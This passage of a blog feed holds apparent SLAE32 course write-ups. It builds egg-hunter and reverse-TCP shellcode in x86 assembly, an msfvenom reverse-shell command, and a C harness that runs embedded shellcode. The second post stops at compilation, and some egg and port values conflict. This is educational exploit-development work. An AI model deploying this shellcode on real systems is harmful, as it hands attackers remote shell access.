&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep access
#define __NR_access 33
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, after the initialization of the Egg’s value, the next step will be to define the function that will be used to go to the next page.
Knowing that the size of a page is 4096 bytes (can be checked with the command line “getconf PAGESIZE”), we need to create a function to will jump of 4096 bytes if after checking the first address value a EFAULT error is returned. 
But, the hexadecimal value of 4096 is 0x1000 which contains a NULL so we need to create a function that will avoid null values in the shellcode. To resolve this issue, instead of jumping of 4096 bytes directly, we can create a function that jump of 4095 (0xfff in hexadecimal) and then we will increment the value by 1 afterward.&lt;/p&gt;

&lt;p&gt;Here as follows the function :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;next_page : 
    or dx, 0xfff ; or operation to go to the next page, 4095
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The next steps will be to build a function that will go though the page, first check if the address can be access with the “access” syscall, if not it will call the function next_page, and if so, it will go thought the page to search for the Egg. And, when the 4 bytes value of the egg (0x90509050) are find, the next 4 bytes will be compared as well.&lt;/p&gt;

&lt;p&gt;First, we create or next function that will make the syscall.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;next_address :
    inc edx ; the value become 4096 = 0x1000
    pusha ; save the current registers
    lea ebx, [edx + 0x4] ; load the address at the first address of the current page
    mov al, 0x21 ; 0x21 is the heximal value of 33
    int 0x80 ; access syscall
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After the syscall, we need to check that the value returned in EAX is not a EFAULT. The EFAULT error is represented by the decimal value 14 as we can see :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; cat /usr/include/asm-generic/errno-base.h | grep EFAULT
#define	EFAULT		14	/* Bad address */
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Which gives in binary :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(dec) 14 : (bin) 00001110 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we known, the return value in case of EFAULT will be in decimal -14 (-EFAULT). its hexadecimal value is obtained with the following steps :&lt;/p&gt;

&lt;p&gt;First, we invert the bits of the 14 value which gives 241 :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00001110 =&amp;gt; 11110001 = (dec) 241
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And finaly, we add 1 to it :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;11110001 + 1 = 11110010 = (dec) 242 = (hex) 0xf2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So to check if the EFAULT value is return, we need to compare EAX with 0xf2.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cmp al, 0xf2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the values are equals, we need to go to the next page.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;je short next_page
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;if they are not, we can verify that the value at the current address is equal the our egg (0x90509050).&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cmp [edx], esi
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;if they are not equal we can jump to the next address by recurcively calling the next_address function. And if they are equals, we can then check the 4 next bytes of the egg.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jnz next_address ; jump to the next_address if not equals
cmp [edx + 0x4], esi ; compare the value of the next 4 bytes with our egg (0x90509050)
jnz next_address ; jump to the next address if not equals
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, if the 8 bytes matched, it means that the egg has been found and we can jump to the shellcode.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jmp edx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;-c-code--&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; C code  &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;The final step is to define the shellcode that we want to execute. To do that, we used the msfvenom command line as follows to create a reverse tcp shellcode.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/shell_reverse_tcp RHOST=127.0.0.1 LPORT=5555 -f c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, in our C script we will execute the EggHunter shellcode and then store in memory the shellcode that we want to execute with the Egg in front of it.&lt;/p&gt;

&lt;p&gt;To do that with the objdump command line, we retrieve the EggHunter shellcode :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment3-EggHunter# objdump -d EggHunter|grep &apos;[0-9a-f]:&apos;|grep -v &apos;file&apos;|cut -f2 -d:|cut -f1-6 -d&apos; &apos;|tr -s &apos; &apos;|tr &apos;\t&apos; &apos; &apos;|sed &apos;s/ $//g&apos;|sed &apos;s/ /\\x/g&apos;|paste -d &apos;&apos; -s |sed &apos;s/^/&quot;/&apos;|sed &apos;s/$/&quot;/g&apos;
&quot;\x31\xc0\x89\xc6\xbe\x50\x90\x50\x90\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x74\xee\x61\x39\x32\x75\xee\x8d\x5a\x04\x39\x33\x75\xe7\xff\xe2&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We inserted the two paylaod into our C file and finally we compile our C file with the following command line :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -m32 -fno-stack-protector -z execstack -o Egg Egg_Hunter.c 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We verified our shellcode by launching on one side the netcat command line and on the other side our EggHunter executable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment3/final.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Useful link:&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.secpod.com/blog/hunting-the-egg-egg-hunter/&quot; style=&quot;color:#2d8fb3;&quot;&gt;www.secpod.com&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf&quot; style=&quot;color:#2d8fb3;&quot;&gt;www.hick.org&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/docs/english/18482-egg-hunter---a-twist-in-buffer-overflow.pdf&quot; style=&quot;color:#2d8fb3;&quot;&gt;www.exploit-db.com&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/@chaudharyaditya/slae-0x3-egg-hunter-shellcode-6fe367be2776#:~:text=An%20egghunter%20is%20a%20short,pass%20control%20to%20the%20shellcode&quot; style=&quot;color:#2d8fb3;&quot;&gt;medium.com&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;-source-codes--&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Source Codes  &lt;/span&gt;&lt;/h3&gt;

&lt;h4 id=&quot;assembly-code&quot;&gt;Assembly code&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global _start

section .text
_start:

    xor eax, eax ; initialization of the EAX register
    mov esi, eax ; initialization of the ESI register

    ; Egg initialization
    mov esi, dword 0x50905090

next_page : 
    or dx, 0xfff ; or operation to go to the next page, 4095


next_address :
    inc edx ; the value become 4096 = 0x1000
    pusha ; save the current registers
    lea ebx, [edx + 0x4] ; load the address at the first address of the current page
    mov al, 0x21 ; 0x21 is the heximal value of 33
    int 0x80 ; access syscal

    cmp al, 0xf2 ; Check if the return value is a EFAULT
    popa ; get the registers back
    je short next_page ; in case of EFAULT, go to the next page

    cmp [edx], esi ; compare the value at the address with our egg
    jnz next_address ; jump to the next_address if not equals
    cmp [edx + 0x4], esi ; compare the value of the next 4 bytes with our egg (0x90509050)

    jnz next_address ; jump to the next address if not equals

    jmp edx ; jump to the shellcode if the egg is found
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;c-code&quot;&gt;C code&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

unsigned char EggHunter [] = \
&quot;\x31\xc0\x89\xc6\xbe\x90\x50\x90\x50\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x32\x75\xee\x39\x72\x04\x75\xe9\xff\xe2&quot;;

unsigned char shellcode [] = \
    &quot;\x90\x50\x90\x50\x90\x50\x90\x50&quot; // Egg
    &quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&quot;
    &quot;\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02\x0f\x68&quot;
    &quot;\x02\x00\x15\xb3\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1&quot;
    &quot;\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3&quot;
    &quot;\x52\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;

main() {
    printf(&quot;Shellcode Length: %d\n&quot;, strlen(EggHunter));

    int (*ret)() = (int(*)())EggHunter;

    ret();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="SLAE32" /><summary type="html">Description of the assignment Study about the EggHunter shellcode; Create a working demo of the EggHunter; Should be configurable for different payload.</summary></entry><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/09/25/Assign2-Rev.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-09-25T08:45:58+02:00</published><updated>2022-09-25T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/09/25/Assign2-Rev</id><content type="html" xml:base="http://localhost:4000/slae32/2022/09/25/Assign2-Rev.html">&lt;h3 id=&quot;-description-of-the-assignment-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the assignment &lt;/span&gt;&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Create a Shell_Reverse_TCP Shellcode:
    &lt;ul&gt;
      &lt;li&gt;Reverse connects to configured IP and Port;&lt;/li&gt;
      &lt;li&gt;Execs Shell on sucessfull connection;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;IP and Port should be easily configurable.&lt;/li&gt;
&lt;/ul&gt;

&lt;!--more--&gt;

&lt;h3 id=&quot;-msfvenom-example--socket_call-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; MSFVenom example &amp;amp; Socket_call &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;To perform this exercise, we started by analysing the reverse shell code of Metasploit to see how it works and what syscall are made. To do so, we followed the steps as follows to create an image of the different syscalls performed and to make it more visible.&lt;/p&gt;

&lt;p&gt;As follows the command line to generate the graphical diagram of the metasploit reverse shell :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    msfvenom -p linux/x86/shell_reverse_tcp R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000 -G shell_reverse_tcp.dot
    //Then convert into PNG file :
    dot shell_reverse_tcp.dot -Tpng -o shell_reverse_tcp.png 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Result:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment2/assignment2.1.PNG&quot; alt=&quot;drawing&quot; style=&quot;max-width:100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, there are 4 syscalls:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;socket,&lt;/li&gt;
  &lt;li&gt;dup2,&lt;/li&gt;
  &lt;li&gt;connect,&lt;/li&gt;
  &lt;li&gt;execve.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Each of them will be detailled in the following sections.&lt;/p&gt;

&lt;h3 id=&quot;-socketcall-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Socketcall &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;The detail of the socket call can be displayed with the following command line:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep socket
    #define __NR_socketcall 102
    #define __NR_socket 359
    #define __NR_socketpair 360
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, we looked into the details of the socketcall:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man 2 socketcall
int socketcall(int call, unsigned long *args);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The socketcall is composed of two parameters:&lt;/p&gt;

&lt;p&gt;1) int call - Type of the syscall (socket, bind, …)&lt;/p&gt;

&lt;p&gt;2) unsigned long* args - Arguments of the desired syscall&lt;/p&gt;

&lt;h3 id=&quot;-socket-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Socket &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;The socket syscall creates a socket which will listen to the incoming connections.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man 2 socket 
int socket(int domain, int type, int protocol)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The syscall is composed of the following parameters:&lt;/p&gt;

&lt;p&gt;1) int domain - The protocol family used (AF_INET, AF_LOCAL, …)&lt;/p&gt;

&lt;p&gt;2) int type - The type of the service (TCP, UDP, …)&lt;/p&gt;

&lt;p&gt;3) int protocol - Specify if a particular protocol will be used with the socket (0 most of the time)&lt;/p&gt;

&lt;p&gt;Note: More details can be find on the possible parameter values in the following paths:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;/usr/include/x86_64-linux-gnu/bits/socket.h (DOMAIN AND PROTOCOLS parameters)&lt;/li&gt;
  &lt;li&gt;/usr/include/x86_64-linux-gnu/bits/socket_type.h (TYPE parameter)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So, we want to set the following parameters:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;EAX = 0x66 (socketcall syscall)&lt;/li&gt;
  &lt;li&gt;EBX = 0x1 (SOCKET syscall)&lt;/li&gt;
  &lt;li&gt;ECX (Address pointing to the arguments into the stack):
    &lt;ul&gt;
      &lt;li&gt;ECX[0] = 0x2 (PF_INET/AF_INET, IP protocol family)&lt;/li&gt;
      &lt;li&gt;ECX[1] = 0x1 (SOCK_STREAM, TCP connection based)&lt;/li&gt;
      &lt;li&gt;ECX[2] = 0x0 (Unspecified)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After that the syscall is performed with success, the file descriptor returned will be stored in the EAX register.&lt;/p&gt;

&lt;p&gt;Useful link : The details of the &lt;em&gt;socket&lt;/em&gt; can be find in the following links :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://shtroumbiniouf.free.fr/CoursInfo/Reseau2/Cours/SocketsBSD/SocketsBSD.html&quot; style=&quot;color:#2d8fb3;&quot;&gt;shtroumbiniouf.free.fr (French link)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://sdz.tdct.org/sdz/les-sockets.html&quot; style=&quot;color:#2d8fb3;&quot;&gt;sdz.tdct.org (French link)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Assembly Code:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; EBX
xor ebx, ebx
push ebx ; push the x00000000 on the stack
inc ebx ; SYS_SOCKET call 1 for socket
push ebx ; push the 0x00000001 on the stack for the domain AF_INET of the SYS_SOCKET call 
; ECX
push byte 0x2 ; push the 0x00000002 on the stack for the type SOCK_STREAM
mov ecx, esp ; put the arguments of the socketcall into ECX
; EAX
xor eax, eax
mov al, 0x66
; socket call
int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;-dup2-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Dup2 &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;The next step is to redirect the STDIN, STDOUT and STDER to the socket session. The dup2() system call allocate a new file descriptor that refers to the same open file description as the descriptor oldfd. The file descriptor newfd is ajusted so that it refers to the same open file desdcription as oldfd.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep dup2
    #define __NR_dup2 63
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;-&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man 2 dup2
int dup2(int oldfd, int newfd)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The function is composed of:&lt;/p&gt;

&lt;p&gt;1) int oldfd : File descriptor returned by the socket syscall&lt;/p&gt;

&lt;p&gt;2) int newfd : File descriptor that we want to refer to&lt;/p&gt;

&lt;p&gt;We will pass the following arguments :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;EAX : 0x3f (dup syscall, 63 in decimal)&lt;/li&gt;
  &lt;li&gt;EBX : Previous EAX (File descriptor returned by the accept call)&lt;/li&gt;
  &lt;li&gt;ECX : 0x2 to 0x0 (loop IN, OUT, ERR)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To perform the loop, we will use the intruction “JNS rel8” because it perform the jmp until the Sign Flag is set (SF=1), which mean that the zero is taken into account in the loop :&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Assembly Code:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    ; EBX, File descriptor return by ACCEPT call
    mov ebx, eax	; Retrieve the file descriptor

    ; EAX, dup2 sys call 0x3f
    xor eax, eax

    ; initialize ECX 
    mov ecx, 0x2

    ; LOOP

DupLoop :
 
    mov al, 0x3f
    int 0x80
    dec ecx
    jns DupLoop	
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;-connect-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Connect &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;Then, we need to intiate a socket connection on a remote host by specifing the address and the port to connect to. For that, we use the CONNECT syscall.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man 2 connect
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The function is composed of:&lt;/p&gt;

&lt;p&gt;1) int sockfd : file descriptor, return value of the socket syscall&lt;/p&gt;

&lt;p&gt;2) const struct sockaddr *addr : address argument which depends on the family&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct sockaddr {
    sa_family_t sa_family;
    char        sa_data[14];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In our case, with the Internet Family AF_INET, the address structure will be constructed as follows :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct sockaddr_in {
    sa_family_t    sin_family; /* address family: AF_INET */
    in_port_t      sin_port;   /* port in network byte order */
    struct in_addr sin_addr;   /* internet address */
};

/* Internet address. */
struct in_addr {
    uint32_t       s_addr;     /* address in network byte order */
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note: From “/usr/src/linux-headers-5.2.0-kali2-common/include/uapi/linux/in.h”&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;addrlen : The size, in bytes, of the address structure pointed to by addr&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Useful Link:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://man7.org/linux/man-pages/man7/ip.7.html&quot; style=&quot;color:#2d8fb3;&quot;&gt;man7.org (IP manual)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.scip.ch/en/?labs.20200521&quot; style=&quot;color:#2d8fb3;&quot;&gt;www.scip.ch (Example)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This means that we need to pass the following registers:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;EAX = 0x66 (SOCKET_CALL)&lt;/li&gt;
  &lt;li&gt;EBX = 0x3 (SYS_CONNECT)&lt;/li&gt;
  &lt;li&gt;ECX (Address pointing to the arguments into the stack):
    &lt;ul&gt;
      &lt;li&gt;ECX[0] = File descriptor (Return value of the socket syscall)&lt;/li&gt;
      &lt;li&gt;ECX[1] (Address pointing to arguments into the stack):
        &lt;ul&gt;
          &lt;li&gt;ECX[1.0] = 0x2 (AF_INET)&lt;/li&gt;
          &lt;li&gt;ECX[1.1] = 0x115c (port 4444 in hexa)&lt;/li&gt;
          &lt;li&gt;ECX[1.2] = SYS_CONNECT (IP : 127.0.0.1)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;ECX[2] = 0x10 (16 bytes)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The return value stored in EAX should be 0x00 in case of success!&lt;/p&gt;

&lt;p&gt;TODO 
&lt;strong&gt;Assembly Code:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; EBX ; SYS_CONNECT = 3
xor ebx, ebx
mov bl, 0x3

; ECX, To modify
; Creation of the struct sockaddr_in

; //////////////// Listening address ////////////
; Description: Set up the address to listen to
; Example : 
; 	push edi ; Push on the stack the address 0.0.0.0
; 	push 0x00000000 ; Same
push 0x0100007f ; 127.0.0.1

; /////////////// Listening port ///////////////
; Description : Set up the port to listen to
; Example : push word 0x5c11 ; Push on the stack the port 4444
push word 0x5c11	

push word 0x2 ; Push the Family AF_INET = 2
mov ecx, esp ; mov the structure into ecx

; put all parameters into ECX 
	
push byte 0x10 ; Push on the stack the address length of 16
push ecx
push esi ; push the file descriptor
mov ecx, esp ; Move the stack into ECX

; EAX
xor eax, eax
mov al, 0x66

; connect call
int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;-execve-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Execve &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;FInally, now that we created a socket which connect to a remote host, we finally have to launch a shell through that connection allowing the remote host to interact with the device.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man 2 Execve
int execve(const char *pathname, char *const argv[], char *const envp[])
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The arguments are:&lt;/p&gt;

&lt;p&gt;1) const char *pathname: Pointer to the filename&lt;/p&gt;

&lt;p&gt;2) char *const argv[]: Pointer to the argument of the function&lt;/p&gt;

&lt;p&gt;3) char *const envp[]: Array of pointers to strings passed as environment of the new program&lt;/p&gt;

&lt;p&gt;We will pass the following arguments :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;EAX : 0xb (execve sys call, 11 in decimal)&lt;/li&gt;
  &lt;li&gt;EBX : Pointer to /bin//sh + 0X00000000&lt;/li&gt;
  &lt;li&gt;ECX : Pointer to the address of EBX&lt;/li&gt;
  &lt;li&gt;EDX : NULL&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To pass the argument /bin/sh, we first converted it in hexadecimal and then reverse it.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Assembly Code:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; EXECVE /bin/sh	
; Push the 0x00000000 on the stack
xor eax, eax
push eax

; put the string on the stack
push 0x68732f2f ; //sh : hs// : 68732f2f	
push 0x6e69622f ; /bin : nib/ : 6e69622f	

; setup EBX with the value of ESP
mov ebx, esp

; set up EDX and push null bytes again
push eax
mov edx, esp

; set up ECX argv address on the first dw and null in second dw
push ebx 
; Then move the top of the stack into ECX
mov ecx, esp

; EAX
mov al, 0xb
int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;-compilation-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Compilation &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;Then we compiled the code with the following python script :&lt;/p&gt;

